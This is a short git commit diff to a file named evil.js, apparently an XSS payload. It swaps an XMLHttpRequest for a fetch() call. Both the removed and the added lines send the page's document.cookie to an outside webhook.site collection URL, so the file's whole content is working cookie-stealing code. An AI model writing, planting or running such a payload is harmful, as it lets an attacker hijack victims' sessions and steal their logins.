3c1ca6a4a191e38002b6f7a23ee048550c371140
BillyGoatSherpa <105056122+BillyGoatSherpa@users.noreply.github.com>
2022-12-12 00:53:36 +0000

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,3 +1,1 @@
-var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'https://webhook.site/a9b27ab7-bd76-4981-bd44-a704ba0a11fc' + document.cookie, true);
-xhttp.send();
+fetch("https://webhook.site/a9b27ab7-bd76-4981-bd44-a704ba0a11fc/?cookies="+document.cookie);
